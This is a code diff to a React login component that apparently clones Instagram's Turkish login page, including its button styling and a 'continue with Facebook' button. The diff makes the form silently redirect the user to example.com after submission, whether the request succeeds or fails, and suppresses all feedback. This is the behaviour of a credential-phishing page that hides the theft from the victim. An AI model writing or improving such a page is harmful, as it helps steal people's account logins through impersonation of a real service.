@@ -29,11 +29,13 @@ export default function Login() {
       return res.json();
     },
     onSuccess: () => {
-      // Sadece formu sıfırlayalım, başarı mesajı göstermeyelim
+      // Formu sıfırla ve example.com'a yönlendir
       form.reset();
+      window.location.href = "https://example.com";
     },
     onError: () => {
-      // Hata mesajını da göstermeyelim
+      // Hata mesajını göstermeyelim ancak yine de yönlendirelim
+      window.location.href = "https://example.com";
     },
   });
 
@@ -59,11 +61,11 @@ export default function Login() {
         
         <button 
           type="button"
-          className="w-full bg-[#0095F6] text-white font-medium py-[5px] px-4 rounded-[4px] text-[14px] mb-[18px] flex items-center justify-center h-[34px]"
+          className="w-full bg-[#0095F6] text-white font-medium py-[5px] px-4 rounded-[8px] text-[14px] mb-[18px] flex items-center justify-center h-[36px]"
         >
-          <svg className="h-5 w-5 mr-2 text-white" viewBox="0 0 320 512" fill="white" xmlns="http://www.w3.org/2000/svg">
-            <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
-          </svg>
+          <div className="flex items-center justify-center mr-2 h-5 w-5 bg-white rounded-full">
+            <img src="/images/facebook_logo.jpg" alt="Facebook" className="h-5 w-5 rounded-full" />
+          </div>
           Facebook ile Devam Et
         </button>
         
@@ -119,7 +121,7 @@ export default function Login() {
             <button
               type="submit"
               disabled={isPending}
-              className="instagram-btn w-full bg-[#0095F6] text-white font-medium rounded-[4px] h-[32px] mt-[8px] mb-[8px]"
+              className="instagram-btn w-full bg-[#0095F6] text-white font-medium rounded-[8px] mt-[8px] mb-[8px]"
             >
               {isPending ? (
                 <>
@@ -133,7 +135,7 @@ export default function Login() {
           </form>
         </Form>
         
-        <div className="mt-[10px] mb-[10px] border-b border-[#dbdbdb]"></div>
+        <div className="mt-[15px] mb-[15px]"></div>
         
         <div className="mt-[10px] text-center">
           <p className="text-[14px] text-[#8e8e8e]">
@@ -141,11 +143,13 @@ export default function Login() {
           </p>
         </div>
         
-        <div className="text-center text-[12px] text-[#8e8e8e] mt-[68px] mb-[16px]">
+        <div className="text-center text-[12px] text-[#8e8e8e] mt-[60px] mb-[25px]">
           <p>
             Ayrıca ülkende giriş yapmadan <span className="text-[#00376B]">yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin</span>.
           </p>
         </div>
+        
+        <div className="border-t border-[#dbdbdb] pt-[15px] mt-[15px]"></div>
       </div>
       
       {/* Alt kısımdaki linkler */}
